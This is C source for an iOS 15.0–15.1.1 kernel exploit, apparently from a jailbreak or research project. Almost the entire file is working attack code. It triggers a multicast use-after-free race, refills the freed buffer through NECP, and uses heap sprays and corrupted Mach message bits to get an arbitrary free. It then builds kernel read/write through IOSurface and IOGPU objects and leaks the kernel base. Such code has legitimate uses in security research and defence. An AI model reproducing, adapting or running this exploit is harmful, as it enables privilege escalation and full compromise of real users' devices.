#include "multicast_bytecopy.h"

#include "iokit.h"
#include "IOGPU.h"
#include "IOSurfaceRoot.h"
#include "kernel_rw.h"
#include "get_task.h"
#include "mcast.h"
#include "necp.h"
#include "port_utils.h"
#include "spray.h"
//#include "KernelRwWrapper.h"

uint64_t kernel_base_from_holder(mach_port_t holder, uint64_t holder_addr);

#include <mach/mach.h>
#include <pthread.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#pragma clang diagnostic ignored "-Wdeprecated-declarations"

#define KHEAP_DATA_MAPPABLE_LOC 0xFFFFFFE383200000 // may have to be tweaked per device
#define KHEAP_DEFAULT_MAPPABLE_LOC 0xFFFFFFE376000000 // may have to be tweaked per device
#define BYTECOPY_FIRST_TARGET (KHEAP_DATA_MAPPABLE_LOC + 0x3F8C - BYTECOPY_OFFSET_IPV6) // will copy over trailer size of kmsg (used for identification of which kmsg was corrupted)
#define BYTECOPY_SECOND_TARGET (KHEAP_DATA_MAPPABLE_LOC + 3 - BYTECOPY_OFFSET_IPV6) // will copy over highest byte of kmsg's message bits, turning a non-complex kmsg to a complex one if its size ends in 0x80 (MACH_MSGH_BITS_COMPLEX)
#define BYTECOPY_OFFSET_IPV6 0x28
#define PORTS_COUNT 0x2A00
#define KMSG_SIZE 0x3F80 // the low 0x80 byte of this size will be copied to corrupt the message bits (setting 0x80000000, MACH_MSGH_BITS_COMPLEX)
#define UAF_BUFFER_KALLOC_1664_JOIN_COUNT 64 // UaF buffer ends up in default.kalloc.1664

static mach_port_t notif_port = MACH_PORT_NULL;
static mach_port_t *kheap_default_ports = NULL;
static uint8_t *IOSurfaceClient_array_buf = NULL;
static mach_port_t *kheap_data_ports = NULL;
static int kheap_data_idx = -1;
static int extra_frees_for_device = -1;
static io_connect_t iogpu_connect = MACH_PORT_NULL;

static mach_port_t get_arb_free_holder(void)
{
    int success = 0;
    
    // reliability voodoo
    for (int i = 0; i < 3; ++i)
    {
        mcbc_mcast_increase_race_reliability();
        printf("Increase reliability...\n");
    }
    
    // more reliability voodoo
    pthread_attr_t pattr;
    pthread_attr_init(&pattr);
    pthread_attr_set_qos_class_np(&pattr, QOS_CLASS_USER_INITIATED, 0);
        
    // initialize refill buffer, putting the target for the bytecopy primitive there
    uint8_t *necp_buf = malloc(4096);
    *(uint64_t *)(necp_buf + 0x278) = BYTECOPY_FIRST_TARGET;
    
    printf("Start (will fail if device has not been rebooted since last run)\n");
    kheap_data_idx = -1;
    for (int iterations = 0; iterations < 255; ++iterations)
    {
        pthread_t pt1;
        pthread_t pt2;
        int s = socket(AF_INET6, SOCK_DGRAM, 0);
        int necp_fd = mcbc_necp_open(0);
        
        mcbc_mcast_race_sock = s;
        
        // grow the buffer on which the UaF will be triggered to default.kalloc.1664 and
        // put it at its max size before next realloc will occur
        int ip = 0;
        for (ip = 0; ip < UAF_BUFFER_KALLOC_1664_JOIN_COUNT-2; ++ip)
        {
            mcbc_mcast_join_group(ip);
        }
        
        // trigger the UaF in default.kalloc.1664, perform bytecopy primitive if refill is successful
        pthread_create(&pt1, &pattr, (void *(*)(void *))mcbc_mcast_join_group, (void *)(uint64_t)ip);
        pthread_create(&pt2, &pattr, (void *(*)(void *))mcbc_mcast_join_group, (void *)(uint64_t)(ip + 1));
        
        // refill the UaF buffer in default.kalloc.1664 during the race
        for (int i = 0; i < 10; ++i)
        {
            mcbc_spray_default_kalloc_necp(necp_fd, necp_buf, 0x318);
        }
        
        // synchronize
        pthread_join(pt1, NULL);
        pthread_join(pt2, NULL);
        
        // find out if the refill succeeded, in which case a corrupted trailer size will be returned
        // for the holder of the corrupted kmsg, which has also had its message bits corrupted
        // (0x80000000 - MACH_MSGH_BITS_COMPLEX - now set)
        {
            for (int i = 0; i < PORTS_COUNT; ++i)
            {
                int sz = mcbc_port_peek_trailer_size(kheap_data_ports[i]);
                if (sz != 8)
                {
                    printf("kheap_data_idx: %08X\n", i);
                    kheap_data_idx = i;
                    break;
                }
            }
            if (kheap_data_idx != -1)
            {
                success = 1;
                break;
            }
        }

        close(s);
        printf("iteration %d\n", iterations);
    }
    
    if (!success)
    {
        printf("Failed! Run exploit only once per boot\n");
        printf("Make sure you are on iOS 15.0 - 15.1.1 and reboot to try again\n");
        exit(1);
    }
    
    free(necp_buf);
    
    return kheap_data_ports[kheap_data_idx];
}

static int exploitation_init(void)
{
    // different by device, retrieve it first and fail if unsuccessful
    extra_frees_for_device = mcbc_IOGPU_get_command_queue_extra_refills_needed();
    if (extra_frees_for_device == -1)
    {
        printf("Exiting early, provide correct number 1-5 in the code for this device to proceed\n");
        return 1;
    }
    
    kheap_data_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    kheap_default_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    mach_port_t *contained_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    mach_port_t *ool_ports = malloc(0x4000);
    uint8_t *kheap_data_spray_buf = malloc(0x4000);
    memset(kheap_data_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(kheap_default_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(contained_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(ool_ports, 0, 0x4000);
    memset(kheap_data_spray_buf, 0, 0x4000);
     
    // initialize the inline data
    
    // fake descriptor for free primitive
    *(uint32_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t)) = 1;
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t)) = KHEAP_DEFAULT_MAPPABLE_LOC; // free primitive target
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t) + sizeof(uint64_t)) = 0x000007F802110000; // disposition, size, etc
    // align a pointer here so that when the kmsg trailer size is corrupted, this pointer
    // will after that be followed and a second bytecopy performed where it points (kmsg message bits)
    *(uint64_t *)(kheap_data_spray_buf + 0x3F64) = BYTECOPY_SECOND_TARGET;
    
    // spray large sprays to map  KHEAP_DATA_MAPPABLE_LOC and KHEAP_DEFAULT_MAPPABLE_LOC
    for (int i = 0; i < PORTS_COUNT; ++i)
    {
        // KHEAP_DEFAULT
        *ool_ports = mcbc_port_new();
        contained_ports[i] = *ool_ports;
        mach_port_t *pp = mcbc_spray_default_kalloc_ool_ports(0x4000, 1, ool_ports);
        kheap_default_ports[i] = pp[0];
        free(pp);
        
        // KHEAP_DATA_BUFFERS
        kheap_data_ports[i] = mcbc_spray_data_kalloc_kmsg_single(kheap_data_spray_buf, KMSG_SIZE);
    }
    
    notif_port = mcbc_port_new();
    for (int i = 0; i < PORTS_COUNT; ++i)
    {
        mach_port_t prev;
        mach_port_request_notification(mach_task_self(), contained_ports[i], MACH_NOTIFY_NO_SENDERS, 0, notif_port, MACH_MSG_TYPE_MAKE_SEND_ONCE, &prev);
        mach_port_deallocate(mach_task_self(), contained_ports[i]);
    }
    
    // pre-init kernel rw
    IOSurfaceClient_array_buf = malloc(0x4000);
    mcbc_kernel_rw_preinit(KHEAP_DATA_MAPPABLE_LOC - 0x4000 + 0x10, IOSurfaceClient_array_buf, 0x4000);
    
    free(contained_ports);
    free(ool_ports);
    free(kheap_data_spray_buf);
    
    return 0;
}

uintptr_t kernel_base = 0;

static int exploitation_get_krw_with_arb_free(mach_port_t arb_free_holder, uint64_t *current_task)
{
    uint8_t msg_buf[0x100];
    int fildes[2];
    pipe(fildes);
    int read_pipe = fildes[0];
    int write_pipe = fildes[1];
    
    // alloc this one before array of IOSurfaceClients becomes 0x4000
    io_connect_t iosurface_connect_krw = mcbc_IOSurfaceRoot_init();

    // cause max size of arrays of IOSurfaceClients to become 0x4000
    uint32_t last_id = mcbc_IOSurfaceRoot_cause_array_size_to_be_0x4000();
    
    // trigger arbitrary free in kheap default
    mcbc_port_destroy(arb_free_holder);
    
    // do refill in kheap default
    mcbc_IOSurfaceRoot_lookup_surface(iosurface_connect_krw, last_id);
    // NULL out array
    mcbc_IOSurfaceRoot_release_all(iosurface_connect_krw);

    // find allocation at KHEAP_DEFAULT_MAPPABLE_LOC
    int kheap_default_idx = -1;
    for (uint32_t i = 0;
         (i < PORTS_COUNT) && mcbc_port_has_msg(notif_port);
         i++)
    {
        mcbc_port_receive_msg(notif_port, msg_buf, sizeof(msg_buf));
       
        mcbc_port_destroy(kheap_default_ports[i]);

        kheap_default_idx = i;
    }
    
    // Note: don't add time sensitive code here, allocation at KHEAP_DEFAULT_MAPPABLE_LOC
    // has been free'd and will be refilled below
    
    // printf("Allocation at KHEAP_DEFAULT_MAPPABLE_LOC has been free'd\n");
    
    if (kheap_default_idx >= PORTS_COUNT)
    {
        printf("kheap_default_idx >= PORTS_COUNT\n");
        exit(1);
    }
    
    // extra frees
    for (int i = 0; i < extra_frees_for_device; ++i)
    {
        mcbc_port_destroy(kheap_default_ports[(kheap_default_idx+1)+i]);
    }
    
    // do refill
    iogpu_connect = mcbc_IOGPU_init();
    // add entry
    mcbc_IOGPU_create_command_queue(iogpu_connect, KHEAP_DATA_MAPPABLE_LOC - 0x4000 + 0x10);
    
    printf("kheap_default_idx: %08X\n", kheap_default_idx);
    
    // refill in kheap data
    mcbc_port_destroy(kheap_data_ports[kheap_data_idx-1]);
    write(write_pipe, IOSurfaceClient_array_buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);

    mcbc_kernel_rw_init(iosurface_connect_krw, 1, read_pipe, write_pipe);
    
    mcbc_kwrite32(KHEAP_DEFAULT_MAPPABLE_LOC, 0xFEED);
    uint32_t result = mcbc_kread32(KHEAP_DEFAULT_MAPPABLE_LOC);
    printf("Test kwrite32 and kread32: %08X (should be 0000FEED)\n", result);
    if (result != 0xFEED)
    {
        printf("Failed! Reboot to try again (remember to only run once per boot)\n");
        exit(1);
    }
    
    kernel_base = kernel_base_from_holder(kheap_data_ports[kheap_data_idx-2], KHEAP_DATA_MAPPABLE_LOC - 0x8000);
    printf("Got kernel base: %p\n", (void *)kernel_base);
    
    //printf("Get our task\n");
    //*current_task = mcbc_our_task_from_holder(kheap_data_ports[kheap_data_idx-2], KHEAP_DATA_MAPPABLE_LOC - 0x8000);
    //printf("Got kernel task: %p\n", (void *)*current_task);
    
    return 0;
}

void exploitation_cleanup(void)
{
    uint64_t command_queue_loc = mcbc_kread64(KHEAP_DEFAULT_MAPPABLE_LOC + 8);
    uint64_t parent_loc = mcbc_kread64(command_queue_loc + 0x488);
    uint64_t namespace_loc = mcbc_kread64(parent_loc + 0x88);
    
    // bump refs
    mcbc_kwrite32(command_queue_loc + 0x8, 10);
    mcbc_kwrite32(namespace_loc + 0x8, 10);
    
    IOServiceClose(iogpu_connect);
}

int mcbc_run_exploit(void)
{
    uint64_t _current_task = 0;
    
    // generic exploitation init
    if (exploitation_init() != 0)
    {
        return 1;
    }
    
    // trigger bug, get arbitrary free
    mach_port_t arb_free_holder = get_arb_free_holder();
    
    // generic exploitation using arbitrary free
    exploitation_get_krw_with_arb_free(arb_free_holder, &_current_task);
    
    //initKernRw(_current_task, mcbc_kread64, mcbc_kwrite64);
    
    // generic exploitation cleanup (kernel r/w still active)
    //exploitation_cleanup();
    
    return 0;
}
